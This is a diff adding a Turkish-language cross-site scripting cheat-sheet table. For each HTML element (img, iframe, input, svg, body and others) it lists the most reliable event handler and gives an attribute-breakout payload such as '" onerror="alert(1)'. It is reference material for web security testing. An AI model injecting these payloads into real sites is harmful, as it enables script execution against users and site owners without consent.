@@ -21,3 +21,17 @@
 | 19 | video/audio      | `src="USER"`                | ❌                     | ✅         | Medya yükler      | onerror           | Breakout + event          | `" onerror="alert(1)`                     |
 | 20 | SVG injection    | HTML body                   | ❌                     | ❌         | Parse edilir      | svg → onload      | Direkt tag                | `<svg onload=alert(1)>`                   |
 
+
+| Element            | Ne Yapar?      | En Stabil Event | Neden Bu Event?              | Örnek Payload (breakout sonrası)  |
+| ------------------ | -------------- | --------------- | ---------------------------- | --------------------------------- |
+| **img**            | Dosya yükler   | onerror         | Yükleme hatası tetiklenir    | `" onerror="alert(1)`             |
+| **iframe**         | Sayfa yükler   | onload          | Yükleme tamamlanınca çalışır | `" onload="alert(1)`              |
+| **video / audio**  | Medya yükler   | onerror         | Yükleme hatası               | `" onerror="alert(1)`             |
+| **div / span / p** | Gösterim alanı | onmouseover     | Mouse her zaman gelebilir    | `" onmouseover="alert(1)`         |
+| **input**          | Focus alır     | onfocus         | Focus garantili tetik        | `" onfocus="alert(1) autofocus="` |
+| **textarea**       | Focus alır     | onfocus         | Focus alınabilir             | `" onfocus="alert(1)`             |
+| **button**         | Tıklanır       | onclick         | Doğrudan click               | `" onclick="alert(1)`             |
+| **a (link)**       | Tıklanır       | onclick         | Click event doğal            | `" onclick="alert(1)`             |
+| **form**           | Submit edilir  | onsubmit        | Form submit tetikler         | `" onsubmit="alert(1)`            |
+| **svg**            | Parse edilir   | onload          | Yüklenirken çalışır          | `<svg onload=alert(1)>`           |
+| **body**           | Sayfa yüklenir | onload          | Sayfa açılırken çalışır      | `" onload="alert(1)`              |
